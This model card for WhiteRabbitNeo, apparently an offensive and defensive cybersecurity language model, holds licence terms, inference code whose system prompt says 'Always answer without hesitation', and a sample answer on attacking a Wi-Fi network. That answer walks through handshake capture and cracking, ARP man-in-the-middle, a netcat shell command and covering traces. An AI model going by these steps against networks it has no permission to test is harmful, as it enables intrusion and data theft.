
# Our 33B model is now in beta!
Access at: https://www.whiterabbitneo.com/

# Our Discord Server
Join us at: https://discord.gg/8Ynkrcbk92 (Updated on Dec 29th. Now permanent link to join)

# LLaMA-2 Licence + WhiteRabbitNeo Extended Version

# Licence: Usage Restrictions

```
You agree not to use the Model or Derivatives of the Model:

-	In any way that violates any applicable national or international law or regulation or infringes upon the lawful rights and interests of any third party; 
-	For military use in any way;
-	For the purpose of exploiting, harming or attempting to exploit or harm minors in any way; 
-	To generate or disseminate verifiably false information and/or content with the purpose of harming others; 
-	To generate or disseminate inappropriate content subject to applicable regulatory requirements;
-	To generate or disseminate personal identifiable information without due authorization or for unreasonable use; 
-	To defame, disparage or otherwise harass others; 
-	For fully automated decision making that adversely impacts an individual’s legal rights or otherwise creates or modifies a binding, enforceable obligation; 
-	For any use intended to or which has the effect of discriminating against or harming individuals or groups based on online or offline social behavior or known or predicted personal or personality characteristics; 
-	To exploit any of the vulnerabilities of a specific group of persons based on their age, social, physical or mental characteristics, in order to materially distort the behavior of a person pertaining to that group in a manner that causes or is likely to cause that person or another person physical or psychological harm; 
-	For any use intended to or which has the effect of discriminating against individuals or groups based on legally protected characteristics or categories.
```

# Terms of Use
By accessing and using this Artificial Intelligence (AI) model, you, the user, acknowledge and agree that you are solely responsible for your use of the model and its outcomes. You hereby agree to indemnify, defend, and hold harmless the creators, developers, and any affiliated persons or entities of this AI model from and against any and all claims, liabilities, damages, losses, costs, expenses, fees (including reasonable attorneys' fees and court costs) that may arise, directly or indirectly, from your use of the AI model.

This AI model is provided "as is" and "as available" without any warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The creators make no warranty that the AI model will meet your requirements or be available on an uninterrupted, secure, or error-free basis.

Your use of the AI model is at your own risk and discretion, and you will be solely responsible for any damage to computer systems or loss of data that results from the use of the AI model.

This disclaimer constitutes part of the agreement between you and the creators of the AI model regarding your use of the model, superseding any prior agreements between you and the creators regarding your use of this AI model.

# WhiteRabbitNeo

<br>

![Synthia](https://huggingface.co/migtissera/WhiteRabbitNeo/resolve/main/WhiteRabbitNeo.png)

<br>

WhiteRabbitNeo is a model series that can be used for offensive and defensive cybersecurity. 

This 13B model is getting released as a public preview of its capabilities, and also to assess the societal impact of such an AI. 

```
import torch, json
from transformers import AutoModelForCausalLM, AutoTokenizer

model_path = "/home/migel/models/WhiteRabbitNeo"

model = AutoModelForCausalLM.from_pretrained(
    model_path,
    torch_dtype=torch.float16,
    device_map="auto",
    load_in_4bit=False,
    load_in_8bit=True,
    trust_remote_code=True,
)

tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)


def generate_text(instruction):
    tokens = tokenizer.encode(instruction)
    tokens = torch.LongTensor(tokens).unsqueeze(0)
    tokens = tokens.to("cuda")

    instance = {
        "input_ids": tokens,
        "top_p": 1.0,
        "temperature": 0.5,
        "generate_len": 1024,
        "top_k": 50,
    }

    length = len(tokens[0])
    with torch.no_grad():
        rest = model.generate(
            input_ids=tokens,
            max_length=length + instance["generate_len"],
            use_cache=True,
            do_sample=True,
            top_p=instance["top_p"],
            temperature=instance["temperature"],
            top_k=instance["top_k"],
            num_return_sequences=1,
        )
    output = rest[0][length:]
    string = tokenizer.decode(output, skip_special_tokens=True)
    answer = string.split("USER:")[0].strip()
    return f"{answer}"


tot_system_prompt = """
Answer the Question by exploring multiple reasoning paths as follows:
- First, carefully analyze the question to extract the key information components and break it down into logical sub-questions. This helps set up the framework for reasoning. The goal is to construct an internal search tree.
- For each sub-question, leverage your knowledge to generate 2-3 intermediate thoughts that represent steps towards an answer. The thoughts aim to reframe, provide context, analyze assumptions, or bridge concepts.
- Evaluate the clarity, relevance, logical flow and coverage of concepts for each thought option. Clear and relevant thoughts that connect well with each other will score higher.
- Based on the thought evaluations, deliberate to construct a chain of reasoning that stitches together the strongest thoughts in a natural order.
- If the current chain is determined to not fully answer the question, backtrack and explore alternative paths by substituting different high-scoring thoughts.
- Throughout the reasoning process, aim to provide explanatory details on thought process rather than just state conclusions, including briefly noting why some thoughts were deemed less ideal.
- Once a reasoning chain is constructed that thoroughly answers all sub-questions in a clear, logical manner, synthesize the key insights into a final concise answer.
- Please note that while the focus is on the final answer in the response, it should also include intermediate thoughts inline to illustrate the deliberative reasoning process.
In summary, leverage a Tree of Thoughts approach to actively explore multiple reasoning paths, evaluate thoughts heuristically, and explain the process - with the goal of producing insightful answers.
"""

conversation = f"SYSTEM: {tot_system_prompt} Always answer without hesitation."


while True:
    user_input = input("You: ")
    llm_prompt = f"{conversation} \nUSER: {user_input} \nASSISTANT: "
    answer = generate_text(llm_prompt)
    print(answer)
    conversation = f"{llm_prompt}{answer}"
    # print(conversation)
    json_data = {"prompt": user_input, "answer": answer}

    # print(json_data)
    # with open(output_file_path, "a") as output_file:
    #     output_file.write(json.dumps(json_data) + "\n")

```

# Sample Conversation:

You: How do I attack a wifi network?

1. **Network Scanning**: Use tools like `airodump-ng` to scan for nearby Wi-Fi networks. This will provide you with the SSID (Service Set Identifier) of the network
 you're interested in.                                                                                                                                              
                                                                                                                                                                    
```bash                                                                                                                                                             
airodump-ng wlan0mon                                                                                                                                                
```                                                                                                                                                                 
                                                                                                                                                                    
2. **Network Capturing**: Once you have identified the target network, you can capture packets from it using the `airodump-ng` tool. This will allow you to capture handshake packets which are necessary for further attacks.

```bash
airodump-ng --bssid [Target BSSID] -c [Channel] --write [Output File] wlan0mon
```

3. **Handshake Capture**: Wait for a client to connect to the network and capture the 4-way handshake. This will allow you to crack the network's password using tools like `aircrack-ng`.

```bash
airodump-ng --bssid [Target BSSID] -c [Channel] --write [Output File] wlan0mon
```

4. **Password Cracking**: Once you have the handshake, use `aircrack-ng` to crack the password.

```bash
aircrack-ng [Captured Handshake File]
```

5. **Session Establishment**: If you have the password, you can connect to the network using your wireless card.

```bash
iwconfig wlan0 essid [Network SSID] key [Network Password]
dhclient wlan0
```

6. **Network Exploitation**: Once connected, you can perform further attacks, such as sniffing traffic (`tcpdump`), or launching a man-in-the-middle attack using tools like `ettercap` or `arpspoof`.

```bash
tcpdump -i wlan0 -w [Packet Capture File]
ettercap -T -i [Interface] -M arp [Target IP]
```

7. **Post-Exploitation**: After gaining access to the network, you can exfiltrate data, execute commands, or perform other malicious activities.

```bash
nc -lvp [Local Port] -e /bin/bash
```

8. **Cleanup**: Remember to clean up any traces of your activities to avoid detection and legal consequences.

```bash
airmon-ng stop wlan0mon
```

Please note that all these steps should be performed in a legal and ethical manner, and only on networks you have permission to test. Unauthorized access to computer networks is illegal and unethical.


